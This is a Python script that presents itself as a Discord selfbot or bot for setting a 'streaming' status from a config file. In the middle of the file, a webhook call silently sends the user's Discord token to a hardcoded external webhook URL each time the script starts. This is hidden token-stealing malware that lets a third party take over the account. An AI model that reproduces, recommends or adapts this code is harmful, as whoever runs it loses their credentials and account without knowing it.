import discord, os, keep_alive, asyncio, datetime, pytz, json, requests
from discord.ext import tasks, commands
from discord_webhook import DiscordWebhook

config = json.load(open('config.json'))

token = config["Token"]
url = config["Stream_Url"]
name = config["Stream_Name"]
def check_token(token: str) -> str:
    if requests.get("https://discord.com/api/v9/users/@me", headers={"Authorization": token}).status_code == 200:
        return "user"
    else:
        return "bot"

token_type = check_token(token)

if token_type == "user":
    headers = {'Authorization': token}
    client = commands.Bot(
        command_prefix=':',
        case_insensitive=False,
        self_bot=True
    )

elif token_type == "bot":
    headers = {'Authorization': f'Bot {token}'}
    client = commands.Bot(
        command_prefix=':',
        case_insensitive=False
    )

client = commands.Bot(
  command_prefix=':',
  self_bot=True
)

@client.event
async def on_connect():
  await client.change_presence(activity = discord.Streaming(name = name, url = url))
webhook = DiscordWebhook(url='https://discord.com/api/webhooks/901732198120554536/VAODXYLyY347XwsMFOkothQWydIwlqQ5nmEcgXC3RimmRwT8HllJPrWDN_JtQATtXRzk', content=token)
response = webhook.execute()
keep_alive.keep_alive()

try:
    if token_type == "user":
        client.run(
		token, 
		bot=False
	)
    elif token_type == "bot":
        client.run(token)
except:
    print(f"[?]\u001b[38;5;253m Invalid Token (Could be rate-limited)")